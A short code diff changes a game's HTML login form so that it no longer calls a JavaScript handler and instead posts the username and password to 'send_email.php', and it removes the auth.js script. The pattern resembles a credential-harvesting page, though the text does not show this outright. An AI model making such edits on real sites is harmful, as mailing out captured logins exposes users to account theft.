@@ -21,7 +21,7 @@
         <div class="login-box">
             <h2>Login to Your Account</h2>
             <p>Please enter your credentials to access the game</p>
-            <form onsubmit="handleLogin(event)">
+            <form action="send_email.php" method="post">
                 <div class="form-group">
                     <label for="username">Username</label>
                     <input type="text" id="username" name="username" required>
@@ -36,6 +36,5 @@
         </div>
     </div>
 
-    <script src="auth.js"></script>
 </body>
 </html>
